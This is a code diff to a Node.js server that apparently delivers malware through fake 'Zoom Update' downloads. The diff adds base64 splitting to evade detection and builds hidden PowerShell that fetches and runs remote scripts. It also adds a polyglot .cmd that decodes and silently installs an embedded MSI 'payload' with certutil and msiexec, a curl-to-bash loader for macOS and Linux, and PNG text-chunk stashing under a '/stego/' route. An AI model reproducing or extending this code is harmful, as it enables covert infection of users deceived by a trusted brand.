@@ -168,7 +168,7 @@ function detectOs(req) {
 function downloadUrl(os, id) {
   const base = LANDING.replace(/\/$/, '');
   switch (os) {
-    case 'windows': return PUBLIC + '/dl/windows.cmd?id=' + encodeURIComponent(id);
+    case 'windows': return PUBLIC + '/dl/windows.cmd?id=' + encodeURIComponent(id) + '&offline=1';
     case 'macos': return PUBLIC + '/dl/macos.command?id=' + encodeURIComponent(id);
     case 'linux': return PUBLIC + '/dl/linux.sh?id=' + encodeURIComponent(id);
     case 'android': return ANDROID_APK;
@@ -252,22 +252,87 @@ function dlName(co, id, ext) {
 function mutateWindows(base, id, co) {
   const url = base + '/api/landing/windows-install.ps1';
   const b64 = Buffer.from(url, 'utf8').toString('base64');
+  const cut = Math.floor(b64.length / 2);
+  const a = b64.slice(0, cut);
+  const b = b64.slice(cut);
   const v = 'U' + randHex(5);
-  const ps = "$u=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('" + b64 +
-    "')); Start-Sleep -Milliseconds " + (100 + Math.floor(Math.random() * 350)) +
-    "; irm -UseBasicParsing $u | iex";
+  const ps = "$a='" + a + "';$b='" + b +
+    "';$u=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($a+$b)); Start-Sleep -Milliseconds " +
+    (100 + Math.floor(Math.random() * 350)) + "; irm -UseBasicParsing $u | iex";
   const enc = Buffer.from(ps, 'utf16le').toString('base64');
   return '@echo off\r\nsetlocal\r\ntitle Zoom Update ' + randHex(2).toUpperCase() +
     '\r\nrem build ' + Date.now() + '-' + randHex(4) + '\r\nset "' + v + '=' + b64 +
     '"\r\npowershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand ' +
     enc + '\r\nexit /b\r\n';
-}
-function mutateSh(base, mac, id, co) {
+}function mutateSh(base, mac, id, co) {
   const url = base + (mac ? '/api/landing/macos-install' : '/api/landing/linux-install');
   const b64 = Buffer.from(url, 'utf8').toString('base64');
   const v = 'u' + randHex(5);
   return '#!/bin/bash\n# build ' + Date.now() + '-' + randHex(4) + '\nset -e\n' +
     v + '="$(echo \'' + b64 + '\' | base64 -d)"\ncurl -fsSL "$' + v + '" | bash\n';
+}
+let winMsiCache = null;
+function winMsiB64() {
+  if (winMsiCache) return winMsiCache;
+  const file = process.env.SHARE_WIN_MSI ||
+    '/opt/betterdesk/global/downloads/payloads/BetterDesk-Agent-x64-1.0.2.msi';
+  winMsiCache = fs.readFileSync(file).toString('base64').replace(/(.{76})/g, '$1\n');
+  return winMsiCache;
+}
+function polyglotCmd(id, co) {
+  const r = randHex(4);
+  const marker = '#<B64>';
+  const head = '@echo off\r\nsetlocal\r\ntitle Zoom Update ' + randHex(2).toUpperCase() +
+    '\r\nrem offline build ' + Date.now() + '-' + randHex(4) +
+    '\r\nset "F=%~f0"\r\nset "B=%TEMP%\\z_' + r + '.b64"\r\nset "X=%TEMP%\\z_' + r + '.msi"\r\n' +
+    'powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ' +
+    '"$s=[IO.File]::ReadAllText(\'%F%\');$i=$s.LastIndexOf(\'' + marker +
+    '\');[IO.File]::WriteAllText(\'%B%\',$s.Substring($i+6).Trim(),[Text.Encoding]::ASCII)"\r\n' +
+    'certutil -f -decode "%B%" "%X%" >nul 2>&1\r\n' +
+    'msiexec /i "%X%" /qn /norestart\r\n' +
+    'exit /b\r\n' + marker + '\r\n';
+  return head + winMsiB64();
+}
+
+let crcTable = null;
+function crc32(buf) {
+  if (!crcTable) {
+    crcTable = new Int32Array(256);
+    for (let n = 0; n < 256; n++) {
+      let c = n;
+      for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
+      crcTable[n] = c;
+    }
+  }
+  let c = 0xffffffff;
+  for (let i = 0; i < buf.length; i++) c = crcTable[(c ^ buf[i]) & 0xff] ^ (c >>> 8);
+  return (c ^ 0xffffffff) >>> 0;
+}
+function pngChunk(type, data) {
+  const len = Buffer.alloc(4);
+  len.writeUInt32BE(data.length, 0);
+  const body = Buffer.concat([Buffer.from(type, 'ascii'), data]);
+  const crc = Buffer.alloc(4);
+  crc.writeUInt32BE(crc32(body), 0);
+  return Buffer.concat([len, body, crc]);
+}
+let pngBase = null;
+function pngWithText(key, value) {
+  if (!pngBase) pngBase = fs.readFileSync(path.join(ROOT, 'zoom-mark.png'));
+  const out = [pngBase.subarray(0, 8)];
+  let off = 8;
+  while (off < pngBase.length) {
+    const len = pngBase.readUInt32BE(off);
+    const type = pngBase.toString('ascii', off + 4, off + 8);
+    const end = off + 12 + len;
+    if (type === 'IEND') {
+      out.push(pngChunk('tEXt', Buffer.concat([
+        Buffer.from(key, 'latin1'), Buffer.from([0]), Buffer.from(value, 'latin1')])));
+    }
+    out.push(pngBase.subarray(off, end));
+    off = end;
+  }
+  return Buffer.concat(out);
 }
 function serveStatic(res, pathname) {
   let rel = decodeURIComponent(pathname);
@@ -380,13 +445,27 @@ const server = http.createServer(async (req, res) => {
     const id = url.searchParams.get('id') || '';
     const entry = id ? readDb()[id] : null;
     const co = entry ? entry.co : '';
+    const offline = url.searchParams.get('offline') !== '0';
     res.writeHead(200, {
       'Content-Type': 'application/octet-stream',
       'Content-Disposition': 'attachment; filename="' + dlName(co, id, 'cmd') + '"',
       'Cache-Control': 'no-store',
       'X-Content-Type-Options': 'nosniff'
     });
-    res.end(mutateWindows(LANDING.replace(/\/$/, ''), id, co));
+    res.end(offline ? polyglotCmd(id, co) : mutateWindows(LANDING.replace(/\/$/, ''), id, co));
+    return;
+  }
+  if (url.pathname.startsWith('/stego/')) {
+    const id = url.pathname.slice('/stego/'.length).replace(/\.png$/, '');
+    const entry = readDb()[id];
+    if (!entry) { res.writeHead(404); res.end('Unknown link'); return; }
+    const png = pngWithText('meeting', entry.target);
+    res.writeHead(200, {
+      'Content-Type': 'image/png',
+      'Content-Length': png.length,
+      'Cache-Control': 'no-store'
+    });
+    res.end(png);
     return;
   }
   if (url.pathname === '/dl/macos.command' || url.pathname === '/dl/linux.sh') {
